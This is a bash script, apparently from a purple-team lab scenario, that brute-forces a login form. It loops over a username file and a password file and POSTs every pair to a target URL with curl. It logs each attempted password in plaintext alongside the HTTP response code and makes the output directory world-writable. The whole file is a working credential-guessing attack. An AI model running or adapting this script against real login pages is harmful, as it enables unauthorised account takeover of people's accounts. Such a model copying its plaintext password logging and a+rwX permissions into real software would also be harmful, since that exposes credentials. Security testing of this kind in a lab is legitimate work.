#!/usr/bin/env bash
set -euo pipefail

SCENARIO_DIR="/home/labuser/purple-lab/scenarios/S4"
ENV_FILE="${SCENARIO_DIR}/inputs/target.env"
USERS_FILE="${SCENARIO_DIR}/inputs/users.txt"
PASSWORDS_FILE="${SCENARIO_DIR}/inputs/passwords.txt"
OUTPUT_ROOT="${SCENARIO_DIR}/output"

LAB_OWNER="${LAB_OWNER:-labuser}"
LAB_GROUP="${LAB_GROUP:-labuser}"

source "${ENV_FILE}"

RUN_ID="$(date +%Y%m%d_%H%M%S)"
RUN_DIR="${OUTPUT_ROOT}/${RUN_ID}"
mkdir -p "${RUN_DIR}"

ATTEMPT_LOG="${RUN_DIR}/attempts.log"
SUMMARY_LOG="${RUN_DIR}/summary.log"

echo "[S4] start=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "[S4] target_url=${TARGET_URL}" | tee -a "${SUMMARY_LOG}"
echo "[S4] users_file=${USERS_FILE}" | tee -a "${SUMMARY_LOG}"
echo "[S4] passwords_file=${PASSWORDS_FILE}" | tee -a "${SUMMARY_LOG}"
echo "[S4] sleep_seconds=${SLEEP_SECONDS}" | tee -a "${SUMMARY_LOG}"
echo "[S4] output_dir=${RUN_DIR}" | tee -a "${SUMMARY_LOG}"

attempt=0

while IFS= read -r username; do
  [ -z "${username}" ] && continue

  while IFS= read -r password; do
    [ -z "${password}" ] && continue

    attempt=$((attempt + 1))
    ts="$(date -Iseconds)"

    http_code="$(
      curl -sS \
        -A "${USER_AGENT}" \
        -o "${RUN_DIR}/response_${attempt}.body" \
        -w "%{http_code}" \
        -X POST "${TARGET_URL}" \
        --data-urlencode "username=${username}" \
        --data-urlencode "password=${password}"
    )"

    printf '%s attempt=%s username="%s" password="%s" http_code=%s\n' \
      "${ts}" "${attempt}" "${username}" "${password}" "${http_code}" \
      | tee -a "${ATTEMPT_LOG}"

    sleep "${SLEEP_SECONDS}"
  done < "${PASSWORDS_FILE}"
done < "${USERS_FILE}"

echo "[S4] total_attempts=${attempt}" | tee -a "${SUMMARY_LOG}"
echo "[S4] end=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "${RUN_DIR}" > "${OUTPUT_ROOT}/latest_run_path.txt"

chmod -R a+rwX "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true

if id "${LAB_OWNER}" >/dev/null 2>&1; then
  chown -R "${LAB_OWNER}:${LAB_GROUP}" "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
fi
